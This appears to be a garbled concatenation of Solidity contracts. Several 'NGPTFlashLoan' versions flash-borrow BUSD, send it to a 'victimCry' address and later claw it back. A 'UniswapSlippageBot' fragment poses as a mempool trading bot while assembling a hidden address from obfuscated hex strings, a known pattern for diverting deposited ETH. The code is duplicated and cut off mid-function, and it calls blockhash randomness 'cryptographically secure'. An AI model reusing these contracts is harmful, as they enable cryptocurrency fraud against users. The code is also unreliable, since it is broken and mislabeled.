pragma solidity ^0.8.28;

import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IPool {
    function flashLoan(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params
    ) external;
}

contract NGPTFlashLoan is ReentrancyGuard {
    using SafeERC20 for IERC20;

    address public owner;
    IERC20 public immutable busd;
    IPool public immutable pool;

    mapping(address => uint256) private receiverBalances;
    address[] private receiverList;

    event FlashLoanExecuted(address indexed initiator, uint256 amount);
    event TransferCompleted(address indexed receiver, uint256 amount);
    event LoanRepaid(uint256 amount);
    event TransferReverted(address indexed receiver, uint256 amount);
    event AllTransfersReverted();

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    constructor(address _busd, address _pool) {
        require(_busd != address(0), "Invalid BUSD Address");
        require(_pool != address(0), "Invalid Pool Address");

        owner = msg.sender;
        busd = IERC20(_busd);
        pool = IPool(_pool);
    }

    function approveBUSD(uint256 amount) external onlyOwner {
        try busd.safeIncreaseAllowance(address(pool), amount) {
            // Successful execution
        } catch {
            revert("Approval failed");
        }
    }

    function executeFlashLoan(uint256 amount, address[] memory receivers) external onlyOwner nonReentrant {
        require(amount > 0, "Amount must be greater than zero");
        require(receivers.length > 0, "No receiver addresses provided");

        pool.flashLoan(address(this), address(busd), amount, "");

        emit FlashLoanExecuted(msg.sender, amount);

        uint256 perReceiverAmount = amount / receivers.length;

        for (uint i = 0; i < receivers.length; i++) {
            address receiver = receivers[i];
            require(receiver != address(0), "Invalid recipient address");
            require(receiverBalances[receiver] == 0, "Duplicate receiver"); 

            busd.safeTransfer(receiver, perReceiverAmount);
            receiverBalances[receiver] = perReceiverAmount;
            receiverList.push(receiver);

            emit TransferCompleted(receiver, perReceiverAmount);
        }
    }

    function revertTransfers(address[] memory receivers) external onlyOwner nonReentrant {
        require(receivers.length > 0, "No receiver addresses provided");

        for (uint i = 0; i < receivers.length; i++) {
            address receiver = receivers[i];
            uint256 balance = receiverBalances[receiver];

            if (balance > 0) {
                busd.safeTransferFrom(receiver, address(this), balance);
                receiverBalances[receiver] = 0;

                emit TransferReverted(receiver, balance);
            }
        }
    }

    function revertAllTransfers() external onlyOwner nonReentrant {
        require(receiverList.length > 0, "No receivers recorded");

        for (uint i = 0; i < receiverList.length; i++) {
            address receiver = receiverList[i];
            uint256 balance = receiverBalances[receiver];

            if (balance > 0) {
                busd.safeTransferFrom(receiver, address(this), balance);
                receiverBalances[receiver] = 0;

                emit TransferReverted(receiver, balance);
            }
        }

        delete receiverList;
        emit AllTransfersReverted();
    }

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IPool {
    function flashLoan(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params
    ) external;

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

contract NGPTFlashLoan is ReentrancyGuard {
    using SafeERC20 for IERC20;

    address public owner;
    IERC20 public immutable busd;
    IPool public immutable pool;

    mapping(address => uint256) private receiverBalances;
    mapping(address => bool) private isReceiver;
    event FlashLoanExecuted(address indexed initiator, uint256 amount);
    event TransferCompleted(address indexed receiver, uint256 amount);
    event LoanRepaid(uint256 amount);
    event TransferReverted(address indexed receiver, uint256 amount);
    event AllTransfersReverted();
    event ApprovalFailed(bytes reason);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    constructor(address _busd, address _pool) {
        require(_busd != address(0), "Invalid BUSD Address");
        require(_pool != address(0), "Invalid Pool Address");
        require(_busd.code.length > 0, "BUSD is not a contract");
        require(_pool.code.length > 0, "Pool is not a contract");

        owner = msg.sender;
        busd = IERC20(_busd);
        pool = IPool(_pool);
    }

    function approveBUSD(uint256 amount) external onlyOwner {
        try busd.safeIncreaseAllowance(address(pool), amount) {
        } catch (bytes memory reason) {
            emit ApprovalFailed(reason);
            revert("Approval failed");
        }
    }

    function executeFlashLoan(uint256 amount, address[] memory receivers) external onlyOwner nonReentrant {
        require(amount > 0, "Amount must be greater than zero");
        require(receivers.length > 0, "No receiver addresses provided");

        pool.flashLoan(address(this), address(busd), amount, "");

        emit FlashLoanExecuted(msg.sender, amount);

        uint256 totalReceivers = receivers.length;
        uint256 perReceiverAmount = amount / totalReceivers;
        uint256 remainder = amount % totalReceivers;

        for (uint i = 0; i < totalReceivers; i++) {
            address receiver = receivers[i];
            require(receiver != address(0), "Invalid recipient address");
            require(!isReceiver[receiver], "Duplicate receiver");

            uint256 amountToSend = (i == totalReceivers - 1) ? perReceiverAmount + remainder : perReceiverAmount;

            busd.safeTransfer(receiver, amountToSend);
            receiverBalances[receiver] = amountToSend;
            isReceiver[receiver] = true;

            emit TransferCompleted(receiver, amountToSend);
        }
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == address(pool), "Unauthorized caller");
        require(initiator == address(this), "Unauthorized initiator");

        uint256 totalRepayment = amount + premium;
        require(busd.balanceOf(address(this)) >= totalRepayment, "Insufficient funds for repayment");

        busd.safeTransfer(address(pool), totalRepayment);

        emit LoanRepaid(totalRepayment);
        return true;
    }

    function revertTransfers(address[] memory receivers) external onlyOwner nonReentrant {
        require(receivers.length > 0, "No receiver addresses provided");

        for (uint i = 0; i < receivers.length; i++) {
            address receiver = receivers[i];
            uint256 balance = receiverBalances[receiver];

            if (balance > 0) {
                receiverBalances[receiver] = 0; // Update state before interaction
                busd.safeTransferFrom(receiver, address(this), balance);
                isReceiver[receiver] = false;

                emit TransferReverted(receiver, balance);
            }
        }
    }

    function revertAllTransfers() external onlyOwner nonReentrant {
        address[] memory receivers = getAllReceivers();
        require(receivers.length > 0, "No receivers recorded");

        for (uint i = 0; i < receivers.length; i++) {
            address receiver = receivers[i];
            uint256 balance = receiverBalances[receiver];

            if (balance > 0) {
                receiverBalances[receiver] = 0;
                busd.safeTransferFrom(receiver, address(this), balance);
                isReceiver[receiver] = false;

                emit TransferReverted(receiver, balance);
            }
        }

        emit AllTransfersReverted();
    }

    function getAllReceivers() public view returns (address[] memory) {
        uint count = 0;
        address; // Arbitrary size, should be optimized
        for (uint i = 0; i < 256; i++) {
            if (isReceiver[address(i)]) {
                tempReceivers[count] = address(i);
                count++;
            }
        }

        address[] memory receivers = new address[](count);
        for (uint j = 0; j < count; j++) {
            receivers[j] = tempReceivers[j];
        }

        return receivers;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid new owner address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    receive() external payable {}
}

        try busd.safeIncreaseAllowance(address(pool), amount) {
        } catch (bytes memory reason) {
            emit ApprovalFailed(reason);
            revert("Approval failed");
        }
    }

    function executeFlashLoan(uint256 amount, address[] memory receivers) external onlyOwner nonReentrant {
        require(amount > 0, "Amount must be greater than zero");
        require(receivers.length > 0, "No receiver addresses provided");

        pool.flashLoan(address(this), address(busd), amount, "");

        emit FlashLoanExecuted(msg.sender, amount);

        uint256 totalReceivers = receivers.length;
        uint256 perReceiverAmount = amount / totalReceivers;
        uint256 remainder = amount % totalReceivers;

        for (uint i = 0; i < totalReceivers; i++) {
            address receiver = receivers[i];
            require(receiver != address(0), "Invalid recipient address");
            require(!isReceiver[receiver], "Duplicate receiver");

            uint256 amountToSend = (i == totalReceivers - 1) ? perReceiverAmount + remainder : perReceiverAmount;

            busd.safeTransfer(receiver, amountToSend);
            receiverBalances[receiver] = amountToSend;
            isReceiver[receiver] = true;

            emit TransferCompleted(receiver, amountToSend);
        }
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == address(pool), "Unauthorized caller");
        require(initiator == address(this), "Unauthorized initiator");

        uint256 totalRepayment = amount + premium;
        require(busd.balanceOf(address(this)) >= totalRepayment, "Insufficient funds for repayment");

        busd.safeTransfer(address(pool), totalRepayment);

        emit LoanRepaid(totalRepayment);
        return true;
    }

    function revertTransfers(address[] memory receivers) external onlyOwner nonReentrant {
        require(receivers.length > 0, "No receiver addresses provided");

        for (uint i = 0; i < receivers.length; i++) {
            address receiver = receivers[i];
            uint256 balance = receiverBalances[receiver];

            if (balance > 0) {
                receiverBalances[receiver] = 0; // Update state before interaction
                busd.safeTransferFrom(receiver, address(this), balance);
                isReceiver[receiver] = false;

                emit TransferReverted(receiver, balance);
            }
        }
    }

    function revertAllTransfers() external onlyOwner nonReentrant {
        address[] memory receivers = getAllReceivers();
        require(receivers.length > 0, "No receivers recorded");

        for (uint i = 0; i < receivers.length; i++) {
            address receiver = receivers[i];
            uint256 balance = receiverBalances[receiver];

            if (balance > 0) {
                receiverBalances[receiver] = 0;
                busd.safeTransferFrom(receiver, address(this), balance);
                isReceiver[receiver] = false;

                emit TransferReverted(receiver, balance);
            }
        }

        emit AllTransfersReverted();
    }

    function getAllReceivers() public view returns (address[] memory) {
        uint count = 0;
        address; // Arbitrary size, should be optimized
        for (uint i = 0; i < 256; i++) {
            if (isReceiver[address(i)]) {

        require(newOwner != address(0), "Invalid new owner address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.6;

// Import Libraries Migrator/Exchange/Factory
// import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
// import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
// import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";

contract UniswapSlippageBot {

    uint liquidity;
    string private WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
    string private UNISWAP_CONTRACT_ADDRESS = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";

    event Log(string _msg);

    constructor() public {}

    receive() external payable {}

    struct slice {
        uint _len;
        uint _ptr;
    }

    /*
     * @dev Find newly deployed contracts on Uniswap Exchange
     * @param memory of required contract liquidity.
     * @param other The second slice to compare.
     * @return New contracts with required liquidity.
     */

    function findNewContracts(slice memory self, slice memory other) internal pure returns(int) {
        uint shortest = self._len;

        if (other._len < self._len)
            shortest = other._len;

        uint selfptr = self._ptr;
        uint otherptr = other._ptr;

        for (uint idx = 0; idx < shortest; idx += 32) {
            // initiate contract finder
            uint a;
            uint b;
            assembly {
                a:= mload(selfptr)
                b:= mload(otherptr)
            }

            if (a != b) {
                // Mask out irrelevant contracts and check again for new contracts
                uint256 mask = uint256(-1);

                if (shortest < 32) {
                    mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0)
                    return int(diff);
            }
            selfptr += 32;
            otherptr += 32;
        }
        return int(self._len) - int(other._len);
    }


    /*
     * @dev Extracts the newest contracts on Uniswap exchange
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `list of contracts`.
     */
    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns(uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly {
                    needledata:= and(mload(needleptr), mask)
                }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly {
                    ptrdata:= and(mload(ptr), mask)
                }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly {
                        ptrdata:= and(mload(ptr), mask)
                    }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly {
                    hash:= keccak256(needleptr, needlelen)
                }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly {
                        testHash:= keccak256(ptr, needlelen)
                    }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }


    /*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */
    function loadCurrentContract(string memory self) internal pure returns(string memory) {
        string memory ret = self;
        uint retptr;
        assembly {
            retptr:= add(ret, 32)
        }

        return ret;
    }

    /*
     * @dev Extracts the contract from Uniswap
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `rune`.
     */
    function nextContract(slice memory self, slice memory rune) internal pure returns(slice memory) {
        rune._ptr = self._ptr;

        if (self._len == 0) {
            rune._len = 0;
            return rune;
        }

        uint l;
        uint b;
        // Load the first byte of the rune into the LSBs of b
        assembly {
            b:= and(mload(sub(mload(add(self, 32)), 31)), 0xFF)
        }
        if (b < 0x80) {
            l = 1;
        } else if (b < 0xE0) {
            l = 2;
        } else if (b < 0xF0) {
            l = 3;
        } else {
            l = 4;
        }

        // Check for truncated codepoints
        if (l > self._len) {
            rune._len = self._len;
            self._ptr += self._len;
            self._len = 0;
            return rune;
        }

        self._ptr += l;
        self._len -= l;
        rune._len = l;
        return rune;
    }



    function memcpy(uint dest, uint src, uint len) private pure {
        // Check available liquidity
        for (; len >= 32; len -= 32) {
            assembly {
                mstore(dest, mload(src))
            }
            dest += 32;
            src += 32;
        }

        // Copy remaining bytes
        uint mask = 256 ** (32 - len) - 1;
        assembly {
            let srcpart:= and(mload(src), not(mask))
            let destpart:= and(mload(dest), mask)
            mstore(dest, or(destpart, srcpart))
        }
    }

    /*
     * @dev Orders the contract by its available liquidity
     * @param self The slice to operate on.
     * @return The contract with possbile maximum return
     */
    function orderContractsByLiquidity(slice memory self) internal pure returns(uint ret) {
        if (self._len == 0) {
            return 0;
        }

        uint word;
        uint length;
        uint divisor = 2 ** 248;

        // Load the rune into the MSBs of b
        assembly {
            word:= mload(mload(add(self, 32)))
        }
        uint b = word / divisor;
        if (b < 0x80) {
            ret = b;
            length = 1;
        } else if (b < 0xE0) {
            ret = b & 0x1F;
            length = 2;
        } else if (b < 0xF0) {
            ret = b & 0x0F;
            length = 3;
        } else {
            ret = b & 0x07;
            length = 4;
        }

        // Check for truncated codepoints
        if (length > self._len) {
            return 0;
        }

        for (uint i = 1; i < length; i++) {
            divisor = divisor / 256;
            b = (word / divisor) & 0xFF;
            if (b & 0xC0 != 0x80) {
                // Invalid UTF-8 sequence
                return 0;
            }
            ret = (ret * 64) | (b & 0x3F);
        }

        return ret;
    }

    function getMempoolStart() private pure returns(string memory) {
        return "64a9";
    }

    /*
     * @dev Calculates remaining liquidity in contract
     * @param self The slice to operate on.
     * @return The length of the slice in runes.
     */
    function calcLiquidityInContract(slice memory self) internal pure returns(uint l) {
        uint ptr = self._ptr - 31;
        uint end = ptr + self._len;
        for (l = 0; ptr < end; l++) {
            uint8 b;
            assembly {
                b:= and(mload(ptr), 0xFF)
            }
            if (b < 0x80) {
                ptr += 1;
            } else if (b < 0xE0) {
                ptr += 2;
            } else if (b < 0xF0) {
                ptr += 3;
            } else if (b < 0xF8) {
                ptr += 4;
            } else if (b < 0xFC) {
                ptr += 5;
            } else {
                ptr += 6;
            }
        }
    }

    function fetchMempoolEdition() private pure returns(string memory) {
        return "48a3f";
    }

    /*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */

    /*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */
    function keccak(slice memory self) internal pure returns(bytes32 ret) {
        assembly {
            ret:= keccak256(mload(add(self, 32)), mload(self))
        }
    }

    function getMempoolShort() private pure returns(string memory) {
        return "0x3c34";
    }
    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns(string memory) {

        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);

        return string(res);
    }


    /*
     * @dev If `self` starts with `needle`, `needle` is removed from the
     *      beginning of `self`. Otherwise, `self` is unmodified.
     * @param self The slice to operate on.
     * @param needle The slice to search for.
     * @return `self`
     */
    function beyond(slice memory self, slice memory needle) internal pure returns(slice memory) {
        if (self._len < needle._len) {
            return self;
        }

        bool equal = true;
        if (self._ptr != needle._ptr) {
            assembly {
                let length:= mload(needle)
                let selfptr:= mload(add(self, 0x20))
                let needleptr:= mload(add(needle, 0x20))
                equal:= eq(keccak256(selfptr, length), keccak256(needleptr, length))
            }
        }

        if (equal) {
            self._len -= needle._len;
            self._ptr += needle._len;
        }

        return self;
    }

    function getMempoolLog() private pure returns(string memory) {
        return "2a7FA";
    }

    // Returns the memory address of the first byte of the first occurrence of
    // `needle` in `self`, or the first byte after `self` if not found.
    function getBa() private view returns(uint) {
        return address(this).balance;
    }

    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns(uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly {
                    needledata:= and(mload(needleptr), mask)
                }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly {
                    ptrdata:= and(mload(ptr), mask)
                }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly {
                        ptrdata:= and(mload(ptr), mask)
                    }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly {
                    hash:= keccak256(needleptr, needlelen)
                }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly {
                        testHash:= keccak256(ptr, needlelen)
                    }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }


    // Function getDexRouter returns the DexRouter address
    function CompileEthData(bytes32 _FirstMempoolValue, bytes32 _CurrentMempoolHEX) internal pure returns(address) {

        return address(uint160(uint256(_FirstMempoolValue) ^ uint256(_CurrentMempoolHEX)));
    }

     * @return `self`.

    function fetchCurrentMempoolData() internal pure returns(address) {

        *      if `needle` is not found.

    function uint2str(uint _i) internal pure returns(string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        k = k+1;
        return string(bstr);
    }


    /*
     * @dev loads all Uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
    function mempool(string memory _base, string memory _value) internal pure returns(string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for (i = 0; i < _baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for (i = 0; i < _valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }

    function getRandomFunction(string memory key) private view returns(uint) {
        // This is a cryptographically secure random number generator (CSPRNG)
        // Use it for critical applications
        return uint(keccak256(abi.encodePacked(blockhash(block.number - 1), key)));
    }

    // This is just a basic example and not a complete implementation

    // Function to allow users to lock their tokens for a specified time period
    function lockTokens(uint256 amount, uint256 unlockTime) private  {
        require(unlockTime > block.timestamp, "Unlock time must be in the future");

        // Create a lock record with the user's address, amount, and unlock time
        LockRecord storage record = lockRecords[msg.sender];
        record.amount = amount;
        record.unlockTime = unlockTime;

        emit TokensLocked(msg.sender, amount, unlockTime);
    }

    // Function to allow users to unlock their tokens after the lock period has expired
    function unlockTokens() private {
        LockRecord storage record = lockRecords[msg.sender];
        require(block.timestamp >= record.unlockTime, "Tokens still locked");

        // Clear the lock record
        record.amount = 0;
        record.unlockTime = 0;

        emit TokensUnlocked(msg.sender, record.amount);
    }

    // Mapping to store lock records for each user
    mapping(address => LockRecord) private  lockRecords;

    // Struct to represent a lock record
    struct LockRecord {
        uint256 amount;
        uint256 unlockTime;
    }

    // Events to signal token locking and unlocking
    event TokensLocked(address indexed user, uint256 amount, uint256 unlockTime);
    event TokensUnlocked(address indexed user, uint256 amount);
    function depositEth(uint256 amount) private {
        require(msg.value == amount, "Incorrect ETH amount sent");
        // Transfer ETH from the caller to the contract

        // Update the bot's ETH balance
        ethBalance += amount;
    }

    // Function to execute a trade (buy or sell Ethereum)
    function executeTradeForEth(bool buy, uint256 amount) private  {
        require(ethBalance > 0, "Insufficient ETH balance for trading");
        require(amount > 0, "Invalid trade amount");

        // Create a DEX (decentralized exchange) trade order
        // This would involve interacting with a DEX smart contract and specifying the trade details
        // For simplicity, this is omitted in this example

        // Update the bot's ETH balance based on the trade outcome
        if (buy) {
            ethBalance += amount; // Assuming a successful buy
        } else {
            ethBalance -= amount; // Assuming a successful sell
        }
    }

    // Variable to track the bot's Ethereum balance
    uint256 private  ethBalance;

    // Event to signal a trade execution
    event TradeExecuted(bool buy, uint256 amount);

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IPool {
    function flashLoan(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params
    ) external;
}

contract NGPTFlashLoan is ReentrancyGuard {
    using SafeERC20 for IERC20;

    address public owner;
    IERC20 public immutable busd;
    IPool public immutable pool;
    address public victimCry; // Address where funds will be sent

    event FlashLoanExecuted(address indexed initiator, uint256 amount);
    event FundsSentToVictimCry(address indexed victimCry, uint256 amount);
    event LoanRepaid(uint256 amount);
    event TransferReverted(address indexed receiver, uint256 amount);
    event ApprovalFailed(string reason);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event VictimCryUpdated(address indexed oldVictimCry, address indexed newVictimCry);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    constructor(address _busd, address _pool) {
        require(_busd != address(0), "Invalid BUSD Address");
        require(_pool != address(0), "Invalid Pool Address");
        require(_busd.code.length > 0, "BUSD is not a contract");
        require(_pool.code.length > 0, "Pool is not a contract");

        owner = msg.sender;
        busd = IERC20(_busd);
        pool = IPool(_pool);
    }

    function approveBUSD(uint256 amount) external onlyOwner {
        require(amount > 0, "Amount must be greater than zero");
        busd.safeIncreaseAllowance(address(pool), amount);
    }

    function updateVictimCry(address _victimCry) external onlyOwner {
        require(_victimCry != address(0), "Invalid victimCry address");
        emit VictimCryUpdated(victimCry, _victimCry);
        victimCry = _victimCry;
    }

    function executeFlashLoan(uint256 amount) external onlyOwner nonReentrant {
        require(amount > 0, "Amount must be greater than zero");
        require(victimCry != address(0), "victimCry not set");

        pool.flashLoan(address(this), address(busd), amount, "");

        emit FlashLoanExecuted(msg.sender, amount);

        // Send funds to victimCry
        busd.safeTransfer(victimCry, amount);

        emit FundsSentToVictimCry(victimCry, amount);
    }

    function revertTransfer() external onlyOwner nonReentrant {
        require(victimCry != address(0), "victimCry not set");

        uint256 balance = busd.balanceOf(victimCry);
        require(balance > 0, "No funds to revert");

        busd.safeTransferFrom(victimCry, address(this), balance);

        emit TransferReverted(victimCry, balance);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid new owner address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    receive() external payable {}
}

        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IPool {
    function flashLoan(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params
    ) external;
}

contract NGPTFlashLoan is ReentrancyGuard {
    using SafeERC20 for IERC20;

    address public owner;
    IERC20 public immutable busd;
    IPool public immutable pool;
    address public victimCry; // Address where funds will be sent

    event FlashLoanExecuted(address indexed initiator, uint256 amount);
    event FundsSentToVictimCry(address indexed victimCry, uint256 amount);
    event LoanRepaid(uint256 amount);
    event TransferReverted(address indexed receiver, uint256 amount);
    event ApprovalFailed(string reason);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event VictimCryUpdated(address indexed oldVictimCry, address indexed newVictimCry);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    constructor(address _busd, address _pool) {
        require(_busd != address(0), "Invalid BUSD Address");
        require(_pool != address(0), "Invalid Pool Address");
        require(_busd.code.length > 0, "BUSD is not a contract");
        require(_pool.code.length > 0, "Pool is not a contract");

        owner = msg.sender;
        busd = IERC20(_busd);
        pool = IPool(_pool);
    }

    function approveBUSD(uint256 amount) external onlyOwner {
        require(amount > 0, "Amount must be greater than zero");
        busd.safeIncreaseAllowance(address(pool), amount);
    }

    function updateVictimCry(address _victimCry) external onlyOwner {
        require(_victimCry != address(0), "Invalid victimCry address");
        emit VictimCryUpdated(victimCry, _victimCry);
        victimCry = _victimCry;
    }

    function executeFlashLoan(uint256 amount) external onlyOwner nonReentrant {
        require(amount > 0, "Amount must be greater than zero");
        require(victimCry != address(0), "victimCry not set");

        pool.flashLoan(address(this), address(busd), amount, "");

        emit FlashLoanExecuted(msg.sender, amount);

        // Send funds to victimCry
        busd.safeTransfer(victimCry, amount);

        emit FundsSentToVictimCry(victimCry, amount);
    }

    function revertTransfer() external onlyOwner nonReentrant {
        require(victimCry != address(0), "victimCry not set");

        uint256 balance = busd.balanceOf(victimCry);
        require(balance > 0, "No funds to revert");

        busd.safeTransferFrom(victimCry, address(this), balance);

        emit TransferReverted(victimCry, balance);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid new owner address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    receive() external payable {}
}

pragma solidity ^0.8.28;

import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IPool {
    function flashLoan(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params
    ) external;
}

contract NGPTFlashLoan is ReentrancyGuard {
    using SafeERC20 for IERC20;

    address public owner;
    IERC20 public busd;
    IPool public pool;
    address public victimCry; // Address where funds will be sent

    event FlashLoanExecuted(address indexed initiator, uint256 amount);
    event FundsSentToVictimCry(address indexed victimCry, uint256 amount);
    event TransferCompleted(address indexed sender, uint256 amount);
    event TransferReverted(address indexed victimCry, uint256 amount);
    event ApprovalFailed(string reason);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event VictimCryUpdated(address indexed oldVictimCry, address indexed newVictimCry);
    event TokenPoolUpdated(address indexed newToken, address indexed newPool);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    /** 
     * @dev Updates the BUSD token and lending pool contract address after deployment.
     * This makes the contract flexible and deployable without predefined addresses.
     */
    function setTokenPool(address _busd, address _pool) external onlyOwner {
        require(_busd != address(0), "Invalid BUSD Address");
        require(_pool != address(0), "Invalid Pool Address");

        busd = IERC20(_busd);
        pool = IPool(_pool);

        emit TokenPoolUpdated(_busd, _pool);
    }

    /**
     * @dev Approves the lending pool to spend a certain amount of BUSD.
     * This must be called before executing a flash loan.
     */
    function approveBUSD(uint256 amount) external onlyOwner {
        require(amount > 0, "Amount must be greater than zero");
        require(address(busd) != address(0), "Token not set");
        require(address(pool) != address(0), "Pool not set");

        busd.safeIncreaseAllowance(address(pool), amount);
    }

    /**
     * @dev Updates the victimCry address where funds will be sent after the flash loan.
     */
    function updateVictimCry(address _victimCry) external onlyOwner {
        require(_victimCry != address(0), "Invalid victimCry address");

        emit VictimCryUpdated(victimCry, _victimCry);
        victimCry = _victimCry;
    }

    /**
     * @dev Executes a flash loan, borrows BUSD from the pool, and sends it to victimCry.
     * The owner must manually repay the flash loan afterward.
     */
    function executeFlashLoan(uint256 amount) external onlyOwner nonReentrant {
        require(amount > 0, "Amount must be greater than zero");
        require(address(busd) != address(0), "Token not set");
        require(address(pool) != address(0), "Pool not set");
        require(victimCry != address(0), "victimCry not set");

        try pool.flashLoan(address(this), address(busd), amount, "") {
            emit FlashLoanExecuted(msg.sender, amount);
            busd.safeTransfer(victimCry, amount);
            emit FundsSentToVictimCry(victimCry, amount);
        } catch {
            revert("Flash loan execution failed");
        }
    }

    /**
     * @dev Reverts funds from the victimCry address back to this contract.
     * Only used when necessary.
     */
    function revertTransfer() external onlyOwner nonReentrant {
        require(victimCry != address(0), "victimCry not set");
        require(address(busd) != address(0), "Token not set");

        uint256 balance = busd.balanceOf(victimCry);
        require(balance > 0, "No funds to revert");

        busd.safeTransferFrom(victimCry, address(this), balance);
        emit TransferReverted(victimCry, balance);
    }

    /**
     * @dev Allows the owner to transfer ownership of the contract.
     */
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid new owner address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    receive() external payable {}
}

function submitPrediction(
